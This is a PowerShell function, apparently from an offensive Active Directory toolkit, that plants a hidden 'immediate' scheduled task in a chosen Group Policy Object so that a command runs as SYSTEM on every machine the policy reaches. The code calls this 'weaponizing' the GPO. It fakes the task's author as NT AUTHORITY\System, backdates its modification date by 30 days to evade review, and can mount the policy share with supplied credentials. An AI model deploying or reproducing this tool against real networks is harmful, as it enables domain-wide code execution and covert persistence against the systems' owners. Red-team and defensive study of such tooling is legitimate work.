function New-GPOImmediateTask {
<#
.SYNOPSIS
Builds an 'Immediate' schtask to push out through a specified GPO.

.DESCRIPTION
Builds an 'Immediate' schtask to push out through a specified GPO.

.PARAMETER TaskName
Name for the schtask to recreate. Required.

.PARAMETER Command
The command to execute with the task, defaults to 'powershell'

.PARAMETER CommandArguments
The arguments to supply to the -Command being launched.

.PARAMETER TaskDescription
An optional description for the task.

.PARAMETER TaskAuthor
The displayed author of the task, defaults to ''NT AUTHORITY\System'

.PARAMETER TaskModifiedDate
The displayed modified date for the task, defaults to 30 days ago.

.PARAMETER GPOname
The GPO name to build the task for.

.PARAMETER Force
TBD

.PARAMETER Remove
TBD

.PARAMETER GPODisplayName
The GPO display name to build the task for.

.PARAMETER Domain
The domain to query for the GPOs, defaults to the current domain.

.PARAMETER DomainController
Domain controller to reflect LDAP queries through.

.PARAMETER ADSpath
The LDAP source to search through
e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"

.PARAMETER Credential
A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target.

.EXAMPLE
PS> New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments '-c "123 | Out-File C:\Temp\debug.txt"' -Force

Create an immediate schtask that executes the specified PowerShell arguments and
push it out to the 'SecurePolicy' GPO, skipping the confirmation prompt.

.EXAMPLE
PS> New-GPOImmediateTask -GPODisplayName SecurePolicy -Remove -Force

Remove all schtasks from the 'SecurePolicy' GPO, skipping the confirmation prompt.
.NOTES
TBD
.LINK
TBD
#>
    [CmdletBinding(DefaultParameterSetName = 'Create')]
    Param (
        [Parameter(ParameterSetName = 'Create', Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskName,

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command = 'powershell',

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $CommandArguments,

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskDescription = '',

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskAuthor = 'NT AUTHORITY\System',

        [Parameter(ParameterSetName = 'Create')]
        [String]
        [ValidateNotNullOrEmpty()]
        $TaskModifiedDate = (Get-Date (Get-Date).AddDays(-30) -Format u).trim("Z"),

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $GPOname,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $GPODisplayName,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $DomainController,
        
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [String]
        $ADSpath,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [Switch]
        $Force,

        [Parameter(ParameterSetName = 'Remove')]
        [Switch]
        $Remove,

        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]        
        [Management.Automation.PSCredential]
        $Credential
    )

    # build the XML spec for our 'immediate' scheduled task
    $TaskXML = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="'+$TaskName+'" image="0" changed="'+$TaskModifiedDate+'" uid="{'+$([guid]::NewGuid())+'}" userContext="0" removePolicy="0"><Properties action="C" name="'+$TaskName+'" runAs="NT AUTHORITY\System" logonType="S4U"><Task version="1.3"><RegistrationInfo><Author>'+$TaskAuthor+'</Author><Description>'+$TaskDescription+'</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>S4U</LogonType></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure></Settings><Actions Context="Author"><Exec><Command>'+$Command+'</Command><Arguments>'+$CommandArguments+'</Arguments></Exec></Actions><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers></Task></Properties></ImmediateTaskV2></ScheduledTasks>'

    if (!$PSBoundParameters['GPOname'] -and !$PSBoundParameters['GPODisplayName']) {
        Write-Warning 'Either -GPOName or -GPODisplayName must be specified'
        return
    }

    # eunmerate the specified GPO(s)
    $GPOs = Get-NetGPO -GPOname $GPOname -DisplayName $GPODisplayName -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -Credential $Credential 
    
    if(!$GPOs) {
        Write-Warning 'No GPO found.'
        return
    }

    $GPOs | ForEach-Object {
        $ProcessedGPOName = $_.Name
        try {
            Write-Verbose "Trying to weaponize GPO: $ProcessedGPOName"

            # map a network drive as New-PSDrive/New-Item/etc. don't accept -Credential properly :(
            if($Credential) {
                Write-Verbose "Mapping '$($_.gpcfilesyspath)' to network drive N:\"
                $Path = $_.gpcfilesyspath.TrimEnd('\')
                $Net = New-Object -ComObject WScript.Network
                $Net.MapNetworkDrive("N:", $Path, $False, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                $TaskPath = "N:\Machine\Preferences\ScheduledTasks\"
            }
            else {
                $TaskPath = $_.gpcfilesyspath + "\Machine\Preferences\ScheduledTasks\"
            }

            if($Remove) {
                if(!(Test-Path "$TaskPath\ScheduledTasks.xml")) {
                    Throw "Scheduled task doesn't exist at $TaskPath\ScheduledTasks.xml"
                }

                if (!$Force -and !$psCmdlet.ShouldContinue('Do you want to continue?',"Removing schtask at $TaskPath\ScheduledTasks.xml")) {
                    return
                }

                Remove-Item -Path "$TaskPath\ScheduledTasks.xml" -Force
            }
            else {
                if (!$Force -and !$psCmdlet.ShouldContinue('Do you want to continue?',"Creating schtask at $TaskPath\ScheduledTasks.xml")) {
                    return
                }
                
                # create the folder if it doesn't exist
                $Null = New-Item -ItemType Directory -Force -Path $TaskPath

                if(Test-Path "$TaskPath\ScheduledTasks.xml") {
                    Throw "Scheduled task already exists at $TaskPath\ScheduledTasks.xml !"
                }

                $TaskXML | Set-Content -Encoding ASCII -Path "$TaskPath\ScheduledTasks.xml"
            }

            if($Credential) {
                Write-Verbose "Removing mounted drive at N:\"
                $Net = New-Object -ComObject WScript.Network
                $Net.RemoveNetworkDrive("N:")
            }
        }
        catch {
            Write-Warning "Error for GPO $ProcessedGPOName : $_"
            if($Credential) {
                Write-Verbose "Removing mounted drive at N:\"
                $Net = New-Object -ComObject WScript.Network
                $Net.RemoveNetworkDrive("N:")
            }
        }
    }
}